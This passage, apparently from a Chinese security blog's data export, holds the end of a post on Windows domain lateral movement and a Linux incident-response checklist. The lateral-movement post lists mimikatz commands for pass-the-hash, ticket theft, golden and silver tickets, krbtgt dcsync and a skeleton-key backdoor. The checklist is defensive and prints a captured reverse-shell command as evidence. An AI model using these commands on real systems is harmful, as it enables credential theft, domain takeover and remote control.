class=\"code\"><pre><span class=\"line\">1.本机抓取密码hash</span><br><span class=\"line\">2.使用mimikatz中的sekurlsa::pth命令</span><br><span class=\"line\">3.弹出cmd.尝试查看目标共享</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<h5 id=\"Pass-The-Ticket\"><a href=\"#Pass-The-Ticket\" class=\"headerlink\" title=\"Pass-The-Ticket\"></a>Pass-The-Ticket</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">查看当前用户的ticket</span></span><br><span class=\"line\">Kerberos::list</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">导出当前用户ticket</span></span><br><span class=\"line\">Kerberos::list /export</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">查看所有ticket</span></span><br><span class=\"line\">Sekurlsa::tickets</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">导出所有ticket</span></span><br><span class=\"line\">Sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>\n\n<p>将获取的票据在其他机器导入</p>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Kerberos::ptt 票据名</span><br><span class=\"line\">导入票据后用<span class=\"symbol\">:Dir</span>\\\\DC\\c<span class=\"variable\">$ </span>测试</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"Pass-The-Cache\"><a href=\"#Pass-The-Cache\" class=\"headerlink\" title=\"Pass-The-Cache\"></a>Pass-The-Cache</h5><p>获取缓存目录的票据</p>\n<h4 id=\"Golden-Ticket\"><a href=\"#Golden-Ticket\" class=\"headerlink\" title=\"Golden Ticket\"></a>Golden Ticket</h4><p>能为任意用户生成TGT票据</p>\n<p>条件:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 域sid</span><br><span class=\"line\">2. 域名</span><br><span class=\"line\">3. 域账户</span><br><span class=\"line\"></span><br><span class=\"line\">利用上面信息用 mimikatz的kerberos::golden命令生成黄金票据</span><br><span class=\"line\">导入票据</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Silver-Ticket\"><a href=\"#Silver-Ticket\" class=\"headerlink\" title=\"Silver Ticket\"></a>Silver Ticket</h4><p>伪装ST</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 域sid</span><br><span class=\"line\">2. 域名</span><br><span class=\"line\">3. 用户名:可以是任意用户名</span><br><span class=\"line\">4. 服务名</span><br><span class=\"line\">5. 目标计算机账户密码hash</span><br><span class=\"line\"></span><br><span class=\"line\">kerberos::golden命令导出白银票据</span><br></pre></td></tr></table></figure>\n\n<p>获取krbtgt凭证</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::dcsync /dc:School-DM.school.com /domain:school.com /user:krbtgt</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Skeleton-key\"><a href=\"#Skeleton-key\" class=\"headerlink\" title=\"Skeleton key\"></a>Skeleton key</h4><p>域后门</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">privilege::debug</span><br><span class=\"line\">misc::skeleton</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">万能密码为mimikatz,操作要在域控上完成,且域控重启后失效.(鸡肋)</span></span><br></pre></td></tr></table></figure>\n\n"},{"title":"应急响应整理","date":"2019-04-21T09:37:15.000Z","_content":"\n# 0x01 Web服务\n1) 检测最近创建的文件和上传目录\n\n```shell\n#查找24小时内被修改的php文件\nfind ./ -mtime 0 -name \"*.php\"\n# n+1天前\nfind ./ -mtime +n -name \"*.php\" \n# n天内\nfind ./ -mtime -n -name \"*.php\"\n#具体还有 atime ctime\n```\n\n2) 与测试环境目录做对比\n\n```shell\ndiff -r {生产dir} {测试dir}\n```\n\n3) 使用Webshell查杀工具\n\nWindows下D盾等，Linux下河马等。\n\n4) 创建Audit审计规则\n\n```shell\nvim /etc/audit/audit.rules\n-a exclude,always -F msgtype=CONFIG_CHANGE\n-a exit,always -F arch=b64 -F uid=48 -S execve -k webshell\n```\n\n\n\n1）扫描特征\n\n通常入侵行为会伴随着踩点和扫描行为，那么可以查一下具有扫描行为的日志。\n\n例如使用AWVS扫描：\n\n```shell\ngrep 'acunetix' /var/log/httpd/access_log\n```\n\n例如使用sqlmap，但是没有使用–random-agent，UA中带有sqlmap\n\n```shell\ngrep 'sqlmap' /var/log/httpd/access_log\n```\n\n2）孤立页面\n\nreferer为 – 的php页面\n\n3）Content-Length\n\n攻击者打包回传，过滤Content-Length大于5M的日志\n\n```shell\nawk '{if($10>5000000){print $0}}' /var/log/httpd/access_log\n```\n\n需要注意这里如果发现疑似Webshell文件，先用stat记录下时间点，不要直接用vim查看编辑文件内容，这样会更改文件的mtime，对于应急响应来说，时间点很重要。对比时间点更容易在Log找到其他的攻击痕迹。\n\n# 0x02 SSH服务\n\n1)  系统账号情况\n1. 查看特权用户\n\n```shell\nawk -F: '$3==0{print $1}' /etc/passwd\n```\n2. 查看可以远程登录的帐号信息\n\n```shell\nawk '/\\$1|\\$6/{print $1}' /etc/shadow\n```\n3. sudo权限权限用户，非必须可删除\n```shell\nmore /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\"\n```\n2）登录情况\n1. 查看失败次数\n\n```shell\ngrep -o \"Failed password\" /var/log/secure|uniq -c\n```\n\n2. 输出登录爆破的第一行和最后一行，确认爆破时间范围\n\n```shell\ngrep \"Failed password\" /var/log/secure|head -1\ngrep \"Failed password\" /var/log/secure|tail -1\n```\n3. 定位爆破ip\n```shell\ngrep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c | sort -nr\n```\n4. 查看爆破用户名字典\n```shell\ngrep \"Failed password\" /var/log/secure| perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}' |uniq -c|sort -nr\n```\n\n5. 登录成功：\n\n  登录成功的日期、用户名、IP\n```shell\ngrep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}'\n```\n​\t\t\t登录成功的IP\n```shell\ngrep 'Accepted' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr\n```\n​\t\t\t或者last，它会读取位于/var/log/wtmp的文件。\n\n6. 登录失败：\n\n```shell\ngrep 'Failed' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr\n```\n\n或者lastb，会读取位于/var/log/btmp的文件\n\n3）检查SSH后门方式：\n\n1. 比对ssh的版本\n\n```\nssh -V\n```\n\n2. 查看ssh配置文件和/usr/sbin/sshd的时间\n\n```shell\nstat /etc/ssh/sshd_config\nstat /usr/sbin/sshd\n```\n\n3. strings检查/usr/sbin/sshd，看是否有邮箱信息\n\nstrings可以查看二进制文件中的字符串，在应急响应中是十分有用的。有些sshd后门会通过邮件发送登录信息，通过\n\n```shell\nstrings /usr/sbin/sshd\n```\n\n可以查看到邮箱信息。\n\n4. 通过strace监控sshd进程读写文件的操作\n\n一般的sshd后门都会将账户密码记录到文件，可以通过strace进程跟踪到ssh登录密码文件。\n\n```shell\nps axu | grep sshd | grep -v grep\n\nroot 65530 0.0 0.1 48428 1260 ? Ss 13:43 0:00 /usr/sbin/sshd\n\nstrace -o aa -ff -p 65530\n\ngrep open aa* | grep -v -e No -e null -e denied| grep WR\n\naa.102586:open(\"/tmp/ilog\", O_WRONLY|O_CREAT|O_APPEND, 0666) = 4\n```\n\n# 0x03 进程\n\n检查是否存在可疑进程，需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，进程可能会隐藏。\n\n1）系统负载\n\n例如挖矿程序特征就是系统负载高。使用Top命令查看\n\n按照CPU排序：Shift+P\n\n按照MEM排序：Shift+M\n\n2）启动时间\n\n与前面找到的Webshell时间点比对。\n\n3）启动权限\n\n木马进程以mysql权限执行的，可以判断是通过Mysql入侵，重点排查Mysql弱口令、UDF提权等。\n\n4）父进程\n\n1. 菜刀中反弹Bash\n\n```shell\n[root@server]#ps -ef | grep '/dev/tcp' | grep -v grep\n\napache   26641  1014  0 14:59 ?        00:00:00 sh -c /bin/sh -c \"cd /root/apache-tomcat-6.0.32/webapps/ROOT/;bash -i >& /dev/tcp/192.168.192.144/2345 0>&1;echo [S];pwd;echo [E]\" 2>&1\n\n[root@server]#ps -ef | grep 1014\napache    1014  1011  0 Sep19 ?        00:00:00 /usr/sbin/httpd\n```\n\n可以看到父进程为apache，就可以判断攻击者通过Web入侵。\n\n2. lsof -p pid：查看可疑进程打开的文件\n\n例如十字病毒，会修改ps和netstat显示的进程名称\n\n```\nudp        0      0 0.0.0.0:49937               0.0.0.0:*                               131683/ls -la\n\nudp        0      0 0.0.0.0:47584               0.0.0.0:*                               116515/ifconfig\n```\n\n很明显的异常，ls和ifconfig不会存在监听行为。\n\n```shell\n[root@DataNode105 admin]# lsof -p 131683\n\nCOMMAND      PID USER   FD   TYPE    DEVICE SIZE/OFF     NODE NAME\n\nhahidjqzx 131683 root  cwd    DIR      8,98     4096 18087937 /root\n\nhahidjqzx 131683 root  rtd    DIR      8,98     4096        2 /\n\nhahidjqzx 131683 root  txt    REG      8,98   625622 24123895 /usr/bin/hahidjqzxs\n```\n\n可疑看到真正的可执行文件是/usr/bin/hahidjqzxs\n\n3. file：查看文件类型：\n\n```shell\n[root@server]# file .zl\n\nzl: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped\n```\n\n4. strings：显示二进制的文件中可读字符\n\n```shell\n[root@server]# strings .zl\n\nrm -f /boot/IptabLes ; rm -f /boot/.IptabLes ; rm -f /boot/IptabLex ; rm -f /boot/.IptabLex ; rm -f /usr\n\n/IptabLes ; rm -f /usr/.IptabLes ; rm -f /usr/IptabLex ; rm -f /usr/.IptabLex\n\nnetstat -anp | grep \"IptabLes\" |awk '{print $NF}' |cut -d \"/\" -f 1 | xargs kill -9 > /dev/null ;free -m\n\n> /dev/null\n\nnetstat -anp | grep \"IptabLex\" |awk '{print $NF}' |cut -d \"/\" -f 1 | xargs kill -9 > /dev/null ;free -m\n\n> /dev/null\n```\n\n例如之前应急遇到的命令替换，通过Strings查看发现有大量的IP地址，就是明显的异常现象。\n\n```shell\n[root@server]# strings /usr/bin/.sshd | egrep '[1-9]{1,3}\\.[1-9]{1,3}\\.'\n8.8.8.8\n8.8.4.4\n8.8.8.8\n61.132.163.68\n202.102.192.68\n202.102.213.68\n58.242.2.2\n202.38.64.1\n211.91.88.129\n211.138.180.2\n218.104.78.2\n202.102.199.68\n202.175.3.3\n```\n\n# 0x04 网络连接\n\n1）短连接\n\n短连接（short connnection）是相对于长连接而言的概念，指的是在数据传送过程中，只在需要发送数据时，才去建立一个连接，数据发送完成后，则断开此连接，即每次连接只完成一项业务的发送。 在系统维护中，一般很难去察觉，需要借助网络安全设备或者抓包分析，才能够去发现。\n\n例：编写脚本捕捉pid和源文件\n\n```shell\n#!/bin/bash\nip=118.184.15.40\ni=1\nwhile :\ndo\n   tmp=`netstat -anplt|grep $ip|awk -F '[/]' '{print $1}'|awk '{print $7}'`\n   #echo $tmp\n   if test -z \"$tmp\"\n   then\n       ((i=i+1)) \n   else\n       for pid in $tmp; do\n           echo \"PID: \"${pid}\n          result=`ls -lh /proc/$pid|grep exe`\n          echo \"Process: \"${result}\n          kill -9 $pid\n       done\n       break\n   fi \ndone\necho \"Total number of times: \"${i}\n```\n\n2）\n\n需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，连接可能会被隐藏。\n\n```shell\nnetstat -antlp | grep ESTABLISHED\n```\n\n查看已经建立的网络连接，例如反弹bash\n\n```shell\nnetstat -antlp | grep EST | grep bash\n```\n检查可以监听端口\n\n```shell\nnetstat -antlp | grep LISTEN\n```\n\n\n# 0x05 敏感目录\n/tmp, /var/tmp, /dev/shm，所有用户都可读，可写，可执行\n\n# 0x06 history\n\n默认的history仅记录执行的命令，然而这些对于应急来说是不够的，很多系统加固脚本会添加记录命令执行的时间，修改记录的最大条数。\n\n# 0x07 开机启动\n\n1）CentOS 5系统\n\n1. /etc/inittab\n   该文件是可以运行process\n2. /etc/rc.d/rc.sysinit\n3. /etc/rc.d/init.d\n4. /etc/rc.d/rc.local\n\n2） CentOS 6 \n1. /etc/init/*.conf\n2.  /etc/rc.d/rc.sysinit\n3. /etc/rc.d/init.d\n4. /etc/rc.d/rc.local\n\n3） CentOS 6 \n1. 排查修改的service\n\n   ```shell\n   find /usr/lib/systemd/system/ -name \"*.service\" | xargs ls -alt | head -n 5\n   find /etc/systemd/system/ -name \"*.service\" | xargs ls -alt | head -n 5\n   ```\n\n2. /etc/rc.d/init.d\n\n3. /etc/rc.d/rc.local\n  不过需要看/etc/rc.d/rc.local是否有x权限。\n\n# 0x08 定时任务\n\n一般常用的定时任务crontab -l是用户级别的，保存在/var/spool/cron/{user}，每个用户都可以通过crontab -e编辑自己的定时任务列表。\n而/etc/crontab是系统级别的定时任务，只有Root账户可以修改。\n另外在应急的时候需要留意的点还有/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly,/etc/cron.monthly等周期性执行脚本的目录。\n\n# 0x09  Rootkit\n\nRootkit功能通常有隐藏文件、进程、连接、模块，网络嗅探，后门，日志擦除，键盘记录（SSH密码记录）等。\n\n检查命令替换，比较直观的方式就是比较命令的大小和mtime了。\n\n1）比对命令的大小\n\n2）查看命令的修改时间，按修改时间排序\n\n```shell\nls -alt /bin/ | head -n 5 \n```\n而比较全面的检测方式有：\n\n3）rpm -aV\n\nRPM Database 不仅提供了 RPM 包的查询功能，还提供了对已安装的 RPM 包进行验证的功能。默认情况下，RPM Database 存放在 /var/lib/rpm 目录。\n\n需要注意这条命令局限性就是只能检查通过RPM包安装的所有文件。另外为了防止rpm也被替换，上传一个安全干净稳定版本rpm二进制到服务器上进行检查。\n\n我们可以对系统中所有 RPM 文件做一个全面检查\n\n```shell\nrpm -aV\n#查看bash\nrpm -Vf /bin/bash\n```\n\n\n\n```shell\nS: 表示文件长度发生了变化\nM: 表示文件的访问权限或文件类型发生了变化\n5: 表示MD5校验和发生了变化。\nD: 表示设备节点的属性发生了变化\nL: 表示文件的符号链接发生率变化\nU: 表示文件/子目录/设备节点的owner发生了变化\nG: 表示文件/子目录/设备节点的group发生了变化\nT: 表示文件最后一次的修改时间发生了变化\n```\n\n4）使用chkrootkit和rkhunter查看\n\n# 0x10 病毒检测\n\n```html\nhttps://x.threatbook.cn/\nhttp://www.virscan.org\nhttps://www.virustotal.com/\nhttps://fireeye.ijinshan.com/\n```\n\n# 0x11 文件权限\n\n一般是使用chattr或者setfacl来设置权限。\n\nchattr可以修改属性能够提高系统的安全性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录，常用参数如下：\n\n```\na：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。\n\ni：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。i参数对于文件 系统的安全设置有很大帮助。\n\ns：保密性地删除文件或目录，即硬盘空间被全部收回。\n\nu：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。\n```\n\n例子：\n\n设置/etc/resolv.conf为不可修改\n\n```shell\n[root@vincent tmp]# chattr +i /etc/resolv.conf\n\n[root@vincent tmp]# lsattr /etc/resolv.conf\n\n----i--------e- /etc/resolv.conf\n\n[root@vincent tmp]# echo \"\" > /etc/resolv.conf\n\n-bash: /etc/resolv.conf: 权限不够\n```\n\n可以使用lsattr查看文件权限\n\nsetfacl其实是设置文件的访问控制列表，传统的 Linux 文件系统的权限控制是通过 user、group、other 与 r(读)、w(写)、x(执行) 的不同组合来实现的，同时存在不灵活的问题， 例如目录 /data 的权限为：drwxr-x—，所有者与所属组均为 root，在不改变所有者的前提下，要求用户 tom 对该目录有完全访问权限 (rwx).考虑以下2种办法 (这里假设 tom 不属于 root group)\n\n(1) 给 /data 的 other 类别增加 rwx permission，这样由于 tom 会被归为 other 类别，那么他也将拥有 rwx 权限。\n\n(2) 将 tom 加入到 root group，为 root group 分配 rwx 权限，那么他也将拥有 rwx 权限。\n\n以上 2 种方法其实都不合适，为了解决这些问题，Linux 开发出了一套新的文件系统权限管理方法，叫文件访问控制列表 (Access Control Lists, ACL)。简单地来说，ACL 就是可以设置特定用户或者用户组对于一个文件的操作权限。文件的所有者以及有CAP_FOWNER（在目前的linux系统上，root用户是唯一有CAP_FOWNER能力的用户）的用户进程可以设置一个文件的acl。ACL 有两种，一种是access ACL，针对文件和目录设置访问控制列表。一种是default ACL，只能针对目录设置。如果目录中的文件没有设置 ACL，它就会使用该目录的默认 ACL.\n\ngetfacl获取文件权限\n\nsetfacl设置Access ACL\n\n```shell\nsetfacl -m u:root:rwx {file}\n#取消ACL\nsetfacl -b {file}\n```\n\n# 参考链接\nhttp://vinc.top/2017/09/20/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A7%BF%E5%8A%BF/\n\nhttps://mp.weixin.qq.com/s/ZUJ87wWbzccw_zSRADfCVg\n\nhttps://mp.weixin.qq.com/s/xodT25Pn3fW1xHrU0IhBDQ\n\nhttps://mp.weixin.qq.com/s/Z0kBcwy379x_J-Xm2Y-Vlg\n\nhttps://www.xsec.io/2018/8/31/emergency-response.html\n\nhttps://www.freebuf.com/articles/network/186071.html\n\nhttps://github.com/iamckn/backdoors\n\nhttps://mp.weixin.qq.com/s/1I0MpWXcyJoe5zGFLnv8gw\n\nhttps://mp.weixin.qq.com/s/-T9wupsSfW1Q73ocPgvMBg\n\nhttps://mp.weixin.qq.com/s/s0Rvlzrwx6uW_Po5AcusnQ\n\nhttps://mp.weixin.qq.com/s/tu3c0l_2Bu4kNGqp3tlxKw","source":"_posts/应急响应整理.md","raw":"---\ntitle: 应急响应整理\ndate: 2019-04-21 17:37:15\ncategories: 应急响应\n---\n\n# 0x01 Web服务\n1) 检测最近创建的文件和上传目录\n\n```shell\n#查找24小时内被修改的php文件\nfind ./ -mtime 0 -name \"*.php\"\n# n+1天前\nfind ./ -mtime +n -name \"*.php\" \n# n天内\nfind ./ -mtime -n -name \"*.php\"\n#具体还有 atime ctime\n```\n\n2) 与测试环境目录做对比\n\n```shell\ndiff -r {生产dir} {测试dir}\n```\n\n3) 使用Webshell查杀工具\n\nWindows下D盾等，Linux下河马等。\n\n4) 创建Audit审计规则\n\n```shell\nvim /etc/audit/audit.rules\n-a exclude,always -F msgtype=CONFIG_CHANGE\n-a exit,always -F arch=b64 -F uid=48 -S execve -k webshell\n```\n\n\n\n1）扫描特征\n\n通常入侵行为会伴随着踩点和扫描行为，那么可以查一下具有扫描行为的日志。\n\n例如使用AWVS扫描：\n\n```shell\ngrep 'acunetix' /var/log/httpd/access_log\n```\n\n例如使用sqlmap，但是没有使用–random-agent，UA中带有sqlmap\n\n```shell\ngrep 'sqlmap' /var/log/httpd/access_log\n```\n\n2）孤立页面\n\nreferer为 – 的php页面\n\n3）Content-Length\n\n攻击者打包回传，过滤Content-Length大于5M的日志\n\n```shell\nawk '{if($10>5000000){print $0}}' /var/log/httpd/access_log\n```\n\n需要注意这里如果发现疑似Webshell文件，先用stat记录下时间点，不要直接用vim查看编辑文件内容，这样会更改文件的mtime，对于应急响应来说，时间点很重要。对比时间点更容易在Log找到其他的攻击痕迹。\n\n# 0x02 SSH服务\n\n1)  系统账号情况\n1. 查看特权用户\n\n```shell\nawk -F: '$3==0{print $1}' /etc/passwd\n```\n2. 查看可以远程登录的帐号信息\n\n```shell\nawk '/\\$1|\\$6/{print $1}' /etc/shadow\n```\n3. sudo权限权限用户，非必须可删除\n```shell\nmore /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\"\n```\n2）登录情况\n1. 查看失败次数\n\n```shell\ngrep -o \"Failed password\" /var/log/secure|uniq -c\n```\n\n2. 输出登录爆破的第一行和最后一行，确认爆破时间范围\n\n```shell\ngrep \"Failed password\" /var/log/secure|head -1\ngrep \"Failed password\" /var/log/secure|tail -1\n```\n3. 定位爆破ip\n```shell\ngrep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c | sort -nr\n```\n4. 查看爆破用户名字典\n```shell\ngrep \"Failed password\" /var/log/secure| perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}' |uniq -c|sort -nr\n```\n\n5. 登录成功：\n\n  登录成功的日期、用户名、IP\n```shell\ngrep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}'\n```\n​\t\t\t登录成功的IP\n```shell\ngrep 'Accepted' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr\n```\n​\t\t\t或者last，它会读取位于/var/log/wtmp的文件。\n\n6. 登录失败：\n\n```shell\ngrep 'Failed' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr\n```\n\n或者lastb，会读取位于/var/log/btmp的文件\n\n3）检查SSH后门方式：\n\n1. 比对ssh的版本\n\n```\nssh -V\n```\n\n2. 查看ssh配置文件和/usr/sbin/sshd的时间\n\n```shell\nstat /etc/ssh/sshd_config\nstat /usr/sbin/sshd\n```\n\n3. strings检查/usr/sbin/sshd，看是否有邮箱信息\n\nstrings可以查看二进制文件中的字符串，在应急响应中是十分有用的。有些sshd后门会通过邮件发送登录信息，通过\n\n```shell\nstrings /usr/sbin/sshd\n```\n\n可以查看到邮箱信息。\n\n4. 通过strace监控sshd进程读写文件的操作\n\n一般的sshd后门都会将账户密码记录到文件，可以通过strace进程跟踪到ssh登录密码文件。\n\n```shell\nps axu | grep sshd | grep -v grep\n\nroot 65530 0.0 0.1 48428 1260 ? Ss 13:43 0:00 /usr/sbin/sshd\n\nstrace -o aa -ff -p 65530\n\ngrep open aa* | grep -v -e No -e null -e denied| grep WR\n\naa.102586:open(\"/tmp/ilog\", O_WRONLY|O_CREAT|O_APPEND, 0666) = 4\n```\n\n# 0x03 进程\n\n检查是否存在可疑进程，需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，进程可能会隐藏。\n\n1）系统负载\n\n例如挖矿程序特征就是系统负载高。使用Top命令查看\n\n按照CPU排序：Shift+P\n\n按照MEM排序：Shift+M\n\n2）启动时间\n\n与前面找到的Webshell时间点比对。\n\n3）启动权限\n\n木马进程以mysql权限执行的，可以判断是通过Mysql入侵，重点排查Mysql弱口令、UDF提权等。\n\n4）父进程\n\n1. 菜刀中反弹Bash\n\n```shell\n[root@server]#ps -ef | grep '/dev/tcp' | grep -v grep\n\napache   26641  1014  0 14:59 ?        00:00:00 sh -c /bin/sh -c \"cd /root/apache-tomcat-6.0.32/webapps/ROOT/;bash -i >& /dev/tcp/192.168.192.144/2345 0>&1;echo [S];pwd;echo [E]\" 2>&1\n\n[root@server]#ps -ef | grep 1014\napache    1014  1011  0 Sep19 ?        00:00:00 /usr/sbin/httpd\n```\n\n可以看到父进程为apache，就可以判断攻击者通过Web入侵。\n\n2. lsof -p pid：查看可疑进程打开的文件\n\n例如十字病毒，会修改ps和netstat显示的进程名称\n\n```\nudp        0      0 0.0.0.0:49937               0.0.0.0:*                               131683/ls -la\n\nudp        0      0 0.0.0.0:47584               0.0.0.0:*                               116515/ifconfig\n```\n\n很明显的异常，ls和ifconfig不会存在监听行为。\n\n```shell\n[root@DataNode105 admin]# lsof -p 131683\n\nCOMMAND      PID USER   FD   TYPE    DEVICE SIZE/OFF     NODE NAME\n\nhahidjqzx 131683 root  cwd    DIR      8,98     4096 18087937 /root\n\nhahidjqzx 131683 root  rtd    DIR      8,98     4096        2 /\n\nhahidjqzx 131683 root  txt    REG      8,98   625622 24123895 /usr/bin/hahidjqzxs\n```\n\n可疑看到真正的可执行文件是/usr/bin/hahidjqzxs\n\n3. file：查看文件类型：\n\n```shell\n[root@server]# file .zl\n\nzl: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped\n```\n\n4. strings：显示二进制的文件中可读字符\n\n```shell\n[root@server]# strings .zl\n\nrm -f /boot/IptabLes ; rm -f /boot/.IptabLes ; rm -f /boot/IptabLex ; rm -f /boot/.IptabLex ; rm -f /usr\n\n/IptabLes ; rm -f /usr/.IptabLes ; rm -f /usr/IptabLex ; rm -f /usr/.IptabLex\n\nnetstat -anp | grep \"IptabLes\" |awk '{print $NF}' |cut -d \"/\" -f 1 | xargs kill -9 > /dev/null ;free -m\n\n> /dev/null\n\nnetstat -anp | grep \"IptabLex\" |awk '{print $NF}' |cut -d \"/\" -f 1 | xargs kill -9 > /dev/null ;free -m\n\n> /dev/null\n```\n\n例如之前应急遇到的命令替换，通过Strings查看发现有大量的IP地址，就是明显的异常现象。\n\n```shell\n[root@server]# strings /usr/bin/.sshd | egrep '[1-9]{1,3}\\.[1-9]{1,3}\\.'\n8.8.8.8\n8.8.4.4\n8.8.8.8\n61.132.163.68\n202.102.192.68\n202.102.213.68\n58.242.2.2\n202.38.64.1\n211.91.88.129\n211.138.180.2\n218.104.78.2\n202.102.199.68\n202.175.3.3\n```\n\n# 0x04 网络连接\n\n1）短连接\n\n短连接（short connnection）是相对于长连接而言的概念，指的是在数据传送过程中，只在需要发送数据时，才去建立一个连接，数据发送完成后，则断开此连接，即每次连接只完成一项业务的发送。 在系统维护中，一般很难去察觉，需要借助网络安全设备或者抓包分析，才能够去发现。\n\n例：编写脚本捕捉pid和源文件\n\n```shell\n#!/bin/bash\nip=118.184.15.40\ni=1\nwhile :\ndo\n   tmp=`netstat -anplt|grep $ip|awk -F '[/]' '{print $1}'|awk '{print $7}'`\n   #echo $tmp\n   if test -z \"$tmp\"\n   then\n       ((i=i+1)) \n   else\n       for pid in $tmp; do\n           echo \"PID: \"${pid}\n          result=`ls -lh /proc/$pid|grep exe`\n          echo \"Process: \"${result}\n          kill -9 $pid\n       done\n       break\n   fi \ndone\necho \"Total number of times: \"${i}\n```\n\n2）\n\n需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，连接可能会被隐藏。\n\n```shell\nnetstat -antlp | grep ESTABLISHED\n```\n\n查看已经建立的网络连接，例如反弹bash\n\n```shell\nnetstat -antlp | grep EST | grep bash\n```\n检查可以监听端口\n\n```shell\nnetstat -antlp | grep LISTEN\n```\n\n\n# 0x05 敏感目录\n/tmp, /var/tmp, /dev/shm，所有用户都可读，可写，可执行\n\n# 0x06 history\n\n默认的history仅记录执行的命令，然而这些对于应急来说是不够的，很多系统加固脚本会添加记录命令执行的时间，修改记录的最大条数。\n\n# 0x07 开机启动\n\n1）CentOS 5系统\n\n1. /etc/inittab\n   该文件是可以运行process\n2. /etc/rc.d/rc.sysinit\n3. /etc/rc.d/init.d\n4. /etc/rc.d/rc.local\n\n2） CentOS 6 \n1. /etc/init/*.conf\n2.  /etc/rc.d/rc.sysinit\n3. /etc/rc.d/init.d\n4. /etc/rc.d/rc.local\n\n3） CentOS 6 \n1. 排查修改的service\n\n   ```shell\n   find /usr/lib/systemd/system/ -name \"*.service\" | xargs ls -alt | head -n 5\n   find /etc/systemd/system/ -name \"*.service\" | xargs ls -alt | head -n 5\n   ```\n\n2. /etc/rc.d/init.d\n\n3. /etc/rc.d/rc.local\n  不过需要看/etc/rc.d/rc.local是否有x权限。\n\n# 0x08 定时任务\n\n一般常用的定时任务crontab -l是用户级别的，保存在/var/spool/cron/{user}，每个用户都可以通过crontab -e编辑自己的定时任务列表。\n而/etc/crontab是系统级别的定时任务，只有Root账户可以修改。\n另外在应急的时候需要留意的点还有/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly,/etc/cron.monthly等周期性执行脚本的目录。\n\n# 0x09  Rootkit\n\nRootkit功能通常有隐藏文件、进程、连接、模块，网络嗅探，后门，日志擦除，键盘记录（SSH密码记录）等。\n\n检查命令替换，比较直观的方式就是比较命令的大小和mtime了。\n\n1）比对命令的大小\n\n2）查看命令的修改时间，按修改时间排序\n\n```shell\nls -alt /bin/ | head -n 5 \n```\n而比较全面的检测方式有：\n\n3）rpm -aV\n\nRPM Database 不仅提供了 RPM 包的查询功能，还提供了对已安装的 RPM 包进行验证的功能。默认情况下，RPM Database 存放在 /var/lib/rpm 